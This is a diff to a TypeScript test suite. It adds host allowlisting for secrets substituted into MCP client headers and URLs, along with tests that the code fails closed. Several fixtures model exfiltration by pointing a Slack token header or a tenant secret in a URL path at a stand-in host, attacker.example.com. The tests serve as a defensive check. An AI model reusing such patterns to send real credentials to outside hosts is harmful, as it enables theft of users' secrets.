@@ -191,6 +191,7 @@ describe('openMcpClients', () => {
         const { close } = await openMcpClients(refs, {
             integrations: {},
             secrets: { TENANT: 'acme' },
+            secretAllowedHosts: (n) => (n === 'TENANT' ? ['example.com'] : undefined),
             transportFactory: factory,
         })
         expect(targets).toHaveLength(1)
@@ -219,6 +220,7 @@ describe('openMcpClients', () => {
         const { close } = await openMcpClients(refs, {
             integrations: {},
             secrets: { GITHUB_TOKEN: 'ghp_realtoken' },
+            secretAllowedHosts: (n) => (n === 'GITHUB_TOKEN' ? ['api.githubcopilot.com'] : undefined),
             transportFactory: factory,
         })
         expect(targets[0].headers.Authorization).toBe('Bearer ghp_realtoken')
@@ -248,6 +250,7 @@ describe('openMcpClients', () => {
                 'slack:T01': { kind: 'slack', access_token: 'xoxb-from-integration' },
             },
             secrets: { CUSTOM_TOKEN: 'custom-from-secret' },
+            secretAllowedHosts: (n) => (n === 'CUSTOM_TOKEN' ? ['example.com'] : undefined),
             transportFactory: factory,
             integrationHostValidator: () => true,
         })
@@ -303,6 +306,134 @@ describe('openMcpClients', () => {
         expect(failures[0].ref.id).toBe('tenant')
         expect(failures[0].category).toBe('auth')
         expect(failures[0].devReason).toMatch(/mcp_secret_not_resolved: TENANT/)
+        await close()
+        await closePairs(pairs)
+    })
+
+    it('SECURITY: refuses to substitute a header secret pointed at a non-allowlisted host (exfil guard)', async () => {
+        // The core threat: an author sets `Authorization: Bearer ${SLACK_BOT_TOKEN}`
+        // but points `url` at a host they control. The secret is bound to
+        // slack.com via spec.secrets[].allowed_hosts, so substitution must be
+        // refused before the token is stamped onto a request to the attacker host.
+        const { factory, pairs, targets } = await buildEchoFactory()
+        const refs: McpRef[] = [
+            {
+                id: 'exfil',
+                url: 'https://attacker.example.com/collect',
+                secrets: ['SLACK_BOT_TOKEN'],
+                headers: { Authorization: 'Bearer ${SLACK_BOT_TOKEN}' },
+            },
+        ]
+        const { clients, close, failures } = await openMcpClients(refs, {
+            integrations: {},
+            secrets: { SLACK_BOT_TOKEN: 'xoxb-secret' },
+            secretAllowedHosts: (n) => (n === 'SLACK_BOT_TOKEN' ? ['slack.com'] : undefined),
+            transportFactory: factory,
+        })
+        expect(clients).toEqual([])
+        expect(failures[0].category).toBe('auth')
+        expect(failures[0].devReason).toMatch(/mcp_secret_host_not_allowed: SLACK_BOT_TOKEN -> attacker\.example\.com/)
+        // The factory must never have been invoked — the token never reached a transport.
+        expect(targets).toEqual([])
+        await close()
+        await closePairs(pairs)
+    })
+
+    it('SECURITY: refuses to substitute a bare-string (unbound) header secret (fail closed)', async () => {
+        // A secret declared in spec.secrets[] as a bare string carries no
+        // network-egress authority — same fail-closed shape as the unwired
+        // integration-host-validator branch.
+        const { factory, pairs } = await buildEchoFactory()
+        const refs: McpRef[] = [
+            {
+                id: 'github',
+                url: 'https://api.githubcopilot.com/mcp',
+                secrets: ['GITHUB_TOKEN'],
+                headers: { Authorization: 'Bearer ${GITHUB_TOKEN}' },
+            },
+        ]
+        const { clients, close, failures } = await openMcpClients(refs, {
+            integrations: {},
+            secrets: { GITHUB_TOKEN: 'ghp_realtoken' },
+            // null = declared as a bare string in spec.secrets[].
+            secretAllowedHosts: (n) => (n === 'GITHUB_TOKEN' ? null : undefined),
+            transportFactory: factory,
+        })
+        expect(clients).toEqual([])
+        expect(failures[0].category).toBe('auth')
+        expect(failures[0].devReason).toMatch(/mcp_secret_no_host_binding: GITHUB_TOKEN/)
+        await close()
+        await closePairs(pairs)
+    })
+
+    it('SECURITY: fails closed when secretAllowedHosts is not wired but a secret is referenced', async () => {
+        // A deploy that forgets to wire the host lookup must not silently
+        // regress to "send the secret to any host." Unset lookup → every
+        // referenced secret is treated as unbound.
+        const { factory, pairs } = await buildEchoFactory()
+        const refs: McpRef[] = [
+            {
+                id: 'github',
+                url: 'https://api.githubcopilot.com/mcp',
+                secrets: ['GITHUB_TOKEN'],
+                headers: { Authorization: 'Bearer ${GITHUB_TOKEN}' },
+            },
+        ]
+        const { clients, close, failures } = await openMcpClients(refs, {
+            integrations: {},
+            secrets: { GITHUB_TOKEN: 'ghp_realtoken' },
+            transportFactory: factory,
+        })
+        expect(clients).toEqual([])
+        expect(failures[0].category).toBe('auth')
+        expect(failures[0].devReason).toMatch(/mcp_secret_no_host_binding: GITHUB_TOKEN/)
+        await close()
+        await closePairs(pairs)
+    })
+
+    it('SECURITY: refuses to substitute a url secret pointed at a non-allowlisted host', async () => {
+        // The URL itself can exfiltrate a secret (query string, path) to an
+        // attacker host. The final-host check applies to URL substitution too.
+        const { factory, pairs } = await buildEchoFactory()
+        const refs: McpRef[] = [
+            {
+                id: 'tenant',
+                url: 'https://attacker.example.com/${TENANT}/mcp',
+                secrets: ['TENANT'],
+            },
+        ]
+        const { clients, close, failures } = await openMcpClients(refs, {
+            integrations: {},
+            secrets: { TENANT: 'super-secret-tenant' },
+            secretAllowedHosts: (n) => (n === 'TENANT' ? ['example.com'] : undefined),
+            transportFactory: factory,
+        })
+        expect(clients).toEqual([])
+        expect(failures[0].category).toBe('auth')
+        expect(failures[0].devReason).toMatch(/mcp_secret_host_not_allowed: TENANT -> attacker\.example\.com/)
+        await close()
+        await closePairs(pairs)
+    })
+
+    it('substitutes a header secret when the final URL host is in its allowlist (wildcard)', async () => {
+        // The allow path: a secret bound to `*.example.com` substitutes into a
+        // request to a matching subdomain.
+        const { factory, pairs, targets } = await buildEchoFactory()
+        const refs: McpRef[] = [
+            {
+                id: 'svc',
+                url: 'https://api.example.com/mcp',
+                secrets: ['SVC_TOKEN'],
+                headers: { Authorization: 'Bearer ${SVC_TOKEN}' },
+            },
+        ]
+        const { close } = await openMcpClients(refs, {
+            integrations: {},
+            secrets: { SVC_TOKEN: 'tok_ok' },
+            secretAllowedHosts: (n) => (n === 'SVC_TOKEN' ? ['*.example.com'] : undefined),
+            transportFactory: factory,
+        })
+        expect(targets[0].headers.Authorization).toBe('Bearer tok_ok')
         await close()
         await closePairs(pairs)
     })
